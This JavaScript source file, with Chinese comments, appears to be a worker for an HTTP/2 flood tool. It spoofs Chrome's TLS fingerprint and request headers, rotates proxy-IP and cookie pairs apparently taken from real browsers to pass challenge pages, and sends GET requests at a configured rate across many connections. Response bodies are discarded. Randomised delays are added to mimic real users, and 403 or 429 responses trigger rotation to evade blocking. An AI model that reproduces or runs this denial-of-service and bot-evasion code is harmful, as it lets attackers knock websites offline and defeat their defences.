        "AES128-SHA",
        "AES256-SHA"
    ].join(":"),
    curves: "X25519:P-256:P-384",
    sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
    alpn: ["h2", "http/1.1"],
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3",
    http2Settings: {
        headerTableSize: 65536,
        enablePush: false,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144
    }
};

function getTLSClientProfile() {
    // 固定返回 Chrome 122 配置
    return CHROME_TLS_PROFILE;
}

const REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://search.yahoo.com/search?p=",
    "https://duckduckgo.com/?q=",
    target.origin + "/"
];

const ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8"
];

function buildHeaders(tlsConfig, cookieString, useChallenge = false, realHeaders = null) {
    // 优先使用每个 Cookie 配对中保存的真实浏览器请求头
    const sourceHeaders = realHeaders || browserHeaders;
    
    if (sourceHeaders && Object.keys(sourceHeaders).length > 0) {
        const headers = {
            ":method": "GET",
            ":authority": sourceHeaders.host || sourceHeaders[':authority'] || target.host,
            ":scheme": "https",
            ":path": target.pathname + target.search
        };
        
        // 复制所有真实的浏览器请求头（包括 Client Hints）
        for (const [key, value] of Object.entries(sourceHeaders)) {
            const lowerKey = key.toLowerCase();
            if (!lowerKey.startsWith(':') && 
                lowerKey !== 'host' && 
                lowerKey !== 'cookie' &&
                lowerKey !== 'referer' &&
                lowerKey !== 'content-length' &&
                lowerKey !== 'connection') {
                headers[lowerKey] = value;
            }
        }
        
        // 使用捕获到的真实 User-Agent，确保与 TLS 指纹一致
        if (sourceHeaders['user-agent']) {
            headers['user-agent'] = sourceHeaders['user-agent'];
        }
        
        // 设置 Referer
        if (useChallenge && (redirectUrl || sourceHeaders.referer)) {
            headers["referer"] = redirectUrl || sourceHeaders.referer;
        } else {
            headers["referer"] = target.origin + target.pathname;
        }
        
        // 更新 Cookie
        if (cookieString) {
            headers["cookie"] = cookieString;
        }
        
        return headers;
    }
    
    const referers = [...REFERERS, target.href, target.origin + "/"];
    let referer = referers[Math.floor(Math.random() * referers.length)];
    if (referer.endsWith("?q=")) {
        referer += encodeURIComponent(target.hostname);
    }
    
    const acceptLang = ACCEPT_LANGUAGES[Math.floor(Math.random() * ACCEPT_LANGUAGES.length)];

    const headers = {
        ":method": "GET",
        ":authority": target.host,
        ":scheme": target.protocol.replace(":", ""),
        ":path": target.pathname + target.search
    };

    // 固定使用 Chrome 122 请求头
    headers["sec-ch-ua"] = `"Chromium";v="${tlsConfig.version}", "Google Chrome";v="${tlsConfig.version}", "Not=A?Brand";v="99"`;
    headers["sec-ch-ua-mobile"] = "?0";
    headers["sec-ch-ua-platform"] = '"Windows"';
    headers["sec-ch-ua-arch"] = '"x86"';
    headers["sec-ch-ua-bitness"] = '"64"';
    headers["sec-ch-ua-full-version"] = `"${tlsConfig.version}.0.0.0"`;
    headers["sec-ch-ua-full-version-list"] = `"Chromium";v="${tlsConfig.version}.0.0.0", "Google Chrome";v="${tlsConfig.version}.0.0.0", "Not=A?Brand";v="99.0.0.0"`;
    headers["sec-ch-ua-model"] = '""';
    headers["sec-ch-ua-platform-version"] = '"15.0.0"';
    headers["upgrade-insecure-requests"] = "1";
    headers["user-agent"] = tlsConfig.userAgent;
    headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
    headers["sec-fetch-site"] = referer ? "cross-site" : "none";
    headers["sec-fetch-mode"] = "navigate";
    headers["sec-fetch-user"] = "?1";
    headers["sec-fetch-dest"] = "document";
    headers["accept-encoding"] = "gzip, deflate, br, zstd";
    headers["accept-language"] = acceptLang;
    headers["priority"] = "u=0, i";
    if (referer) headers["referer"] = referer;

    if (cookieString) {
        headers["cookie"] = cookieString;
    }

    return headers;
}

async function buildConnection(proxyStr, tlsConfig, cookieString, realHeaders = null) {
    const hostPort = target.hostname + ":" + (target.port || 443);

    let baseSock;
    let tlsSock;
    let session;

    try {
        const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error("CONNECT_TIMEOUT")), 10000)
        );

        const connectPromise = (async () => {
            if (proxyStr === 'direct') {
                const tlsOptions = {
                    host: target.hostname,
                    port: target.port || 443,
                    servername: target.hostname,
                    ALPNProtocols: tlsConfig.alpn,
                    ciphers: tlsConfig.ciphers,
                    ecdhCurve: tlsConfig.curves,
                    sigalgs: tlsConfig.sigalgs,
                    secureOptions: 
                        crypto.constants.SSL_OP_NO_SSLv2 | 
                        crypto.constants.SSL_OP_NO_SSLv3 | 
                        crypto.constants.SSL_OP_NO_COMPRESSION,
                    minVersion: tlsConfig.minVersion,
                    maxVersion: tlsConfig.maxVersion,
                    rejectUnauthorized: false,
                    session: undefined,
                    requestOCSP: true
                };
                
                tlsSock = tls.connect(tlsOptions);

                await once(tlsSock, "secureConnect");

                session = http2.connect(target.origin, {
                    createConnection: () => tlsSock,
                    settings: tlsConfig.http2Settings,
                    peerMaxConcurrentStreams: 1000
                });
                
                session.on('connect', () => {
                    // 固定使用 Chrome 的窗口大小
                    session.setLocalWindowSize(15663105);
                });

                await once(session, "connect");
                
                // 记录活动的 session
                activeSessions.push(session);

                return { session, tlsSock, baseSock: null };
            }
            
            const proxy = new URL(proxyStr.startsWith('http') ? proxyStr : `http://${proxyStr}`);
            
            if (proxy.protocol === "https:") {
                baseSock = tls.connect({
                    host: proxy.hostname,
                    port: proxy.port || 443,
                    servername: proxy.hostname,
                    ALPNProtocols: ["h2"],
                    minVersion: "TLSv1.2",
                    maxVersion: "TLSv1.3"
                });
            } else {
                baseSock = net.connect(proxy.port || 80, proxy.hostname);
            }

            await once(baseSock, "connect");

            baseSock.write(`CONNECT ${hostPort} HTTP/1.1\r\nHost: ${hostPort}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);

            const [data] = await once(baseSock, "data");
            const statusLine = data.toString().split('\r\n')[0];
            if (!statusLine.includes("200")) {
                throw new Error("PROXY_CONNECT_FAILED");
            }

            tlsSock = tls.connect({
                socket: baseSock,
                servername: target.hostname,
                ALPNProtocols: tlsConfig.alpn,
                ciphers: tlsConfig.ciphers,
                ecdhCurve: tlsConfig.curves,
                sigalgs: tlsConfig.sigalgs,
                secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
                minVersion: tlsConfig.minVersion,
                maxVersion: tlsConfig.maxVersion,
                rejectUnauthorized: false
            });

            await once(tlsSock, "secureConnect");

            session = http2.connect(target.origin, {
                createConnection: () => tlsSock,
                settings: tlsConfig.http2Settings
            });

            await once(session, "connect");
            
            // 记录活动的 session
            activeSessions.push(session);

            return { session, tlsSock, baseSock };

        })();

        const result = await Promise.race([connectPromise, timeoutPromise]);
        return result;

    } catch (err) {
        if (tlsSock) tlsSock.destroy();
        if (baseSock) baseSock.destroy();
        throw err;
    }
}

async function go() {
    if (cookiePairs.length === 0) {
        debugLog('没有可用的 Cookie-IP 配对，等待重新加载');
        setTimeout(go, 1000);
        return;
    }
    
    const pair = cookiePairs[Math.floor(Math.random() * cookiePairs.length)];
    const proxyStr = pair.proxy;
    const cookieString = pair.cookie;
    const realHeaders = pair.headers || {}; // 获取真实的浏览器请求头
    
    const tlsConfig = getTLSClientProfile();
    
    buildConnection(proxyStr, tlsConfig, cookieString, realHeaders).then(({ session }) => {
        
        let requestCount = 0;
        let errorCount = 0;
        let sessionStartTime = Date.now();
        const SESSION_LIFETIME = 30 * 1000; // 30 秒后重建连接，提高 Cookie-IP 配对轮换频率
        
        // 计算每个连接的请求频率
        // 每个连接每秒发送 requestsPerSecond 个请求
        const requestsPerSecond = Math.ceil(QPS / MAX_CONNECTIONS);
        const intervalMs = Math.floor(1000 / requestsPerSecond); // 请求间隔
        
        // 首次请求前等待随机时间（模拟真实用户）
        const initialDelay = Math.random() * 2000; // 0-2秒随机延迟
        
        function sendRequest() {
            // 检查是否正在关闭
            if (workerShuttingDown) {
                debugLog('Worker 正在关闭，停止发送请求');
                return;
            }
            
            // 检查 session 是否需要重建
            if (session.closed || session.goawayed || session.destroyed) {
                try {
                    session.close();
                } catch (_) {}
                setTimeout(go, 100);
                return;
            }
            
            // 定期重建连接，提高 Cookie-IP 配对轮换频率
            if (Date.now() - sessionStartTime > SESSION_LIFETIME) {
                debugLog(`连接已运行 ${Math.floor(SESSION_LIFETIME / 1000)} 秒，重建连接并切换配对`);
                try {
                    session.close();
                } catch (_) {}
                setTimeout(go, 100);
                return;
            }

            try {
                // 始终使用带挑战令牌的 Referer
                const useChallenge = true;
                const headers = buildHeaders(tlsConfig, cookieString, useChallenge, realHeaders);
                
                const req = session.request(headers);
                req.setTimeout(15000, () => req.close(http2.constants.NGHTTP2_CANCEL)); // 增加超时时间

                req.on("response", hdrs => {
                    const code = hdrs[":status"];
                    if (code) {
                        statusCounter[code] = (statusCounter[code] || 0) + 1;
                        
                        // 只显示非 200 状态码，且每种状态码最多显示 5 次
                        if (code !== 200 && code !== '200') {
                            statusCodeDisplayCount[code] = (statusCodeDisplayCount[code] || 0) + 1;
                            
                            if (statusCodeDisplayCount[code] <= 5) {
                                debugLog(`⚠️  状态码: ${code} | 请求 #${requestCount}`);
                                
                                // 显示完整响应头
                                const responseHeaders = {};
                                for (const [key, value] of Object.entries(hdrs)) {
                                    responseHeaders[key] = value;
                                }
                                debugLog(`完整响应头:`, JSON.stringify(responseHeaders, null, 2));
                                
                                if (statusCodeDisplayCount[code] === 5) {
                                    debugLog(`ℹ️  状态码 ${code} 已显示 5 次，后续不再显示`);
                                }
                            }
                        }
                        
                        if (Object.keys(statusCounter).length > 100) {
                            const codes = Object.keys(statusCounter).sort((a, b) => statusCounter[a] - statusCounter[b]);
                            for (let i = 0; i < 50; i++) {
                                delete statusCounter[codes[i]];
                            }
                        }

                        if (code === 429 || code === 403) {
                            errorCount++;
                            
                            // 连续 3 次错误才标记失效，避免误判
                            if (errorCount >= 3) {
                                debugLog(`连续 ${errorCount} 次错误，标记连接失效`);
                                session.goawayed = true;
                            }
                        } else if (code >= 200 && code < 300) {
                            // 成功响应，重置错误计数
                            errorCount = 0;
                        }
                    }
                });
                
                // 处理响应体，避免缓冲区堆积
                req.on("data", () => {
                    // 读取并丢弃响应体数据
                });
                
                req.on("end", () => {
                    // 响应完成
                });
                
                req.on("error", () => {});
                req.end();

                requestCount++;
                
                // 添加随机延迟，模拟真实用户行为
                const randomDelay = intervalMs + Math.random() * 50; // 增加 0-50ms 随机延迟
                setTimeout(sendRequest, randomDelay);

            } catch (err) {
                setTimeout(go, 100);
            }
        }

        // 首次请求前等待随机延迟
        setTimeout(sendRequest, initialDelay);

    }).catch((err) => {
        debugLog(`连接失败: ${err.message}`);
        setTimeout(go, 1000);
    });
}

// 启动连接 - 使用 HTTP/2 多路复用，增加连接数提高 Cookie-IP 配对利用率
let conns = 0;
// 每个 Worker 创建 8 个连接，每个连接利用 HTTP/2 多路复用发送多个请求
// 每 30 秒轮换一次连接，充分利用 Cookie-IP 配对
const MAX_CONNECTIONS = 8;

debugLog(`Worker 启动 - 目标 QPS: ${QPS}, 连接数: ${MAX_CONNECTIONS}, 每连接 QPS: ${Math.ceil(QPS / MAX_CONNECTIONS)}, 随机使用 ${cookiePairs.length} 个 IP`);

const connectionInterval = setInterval(() => {
    if (conns < MAX_CONNECTIONS) {
        conns++;
        go();
    } else {
        clearInterval(connectionInterval);
        debugLog(`已建立 ${MAX_CONNECTIONS} 个连接，每 30 秒轮换配对`);
    }
}, 500); // 每 500ms 建立一个连接，避免瞬时建立

let gcCounter = 0;
setInterval(() => {
    // 安全地发送消息，捕获可能的 EPIPE 错误
    if (process.send && process.connected) {
        try {
            process.send({ status: statusCounter });
        } catch (err) {
            // IPC 管道已关闭，停止发送
            if (err.code === 'EPIPE' || err.code === 'ERR_IPC_CHANNEL_CLOSED') {
                process.exit(0);
            }
        }
    }
    statusCounter = {};
    
    gcCounter++;
    if (gcCounter >= 60 && global.gc) {
        global.gc();
        gcCounter = 0;
    }
}, 1000);
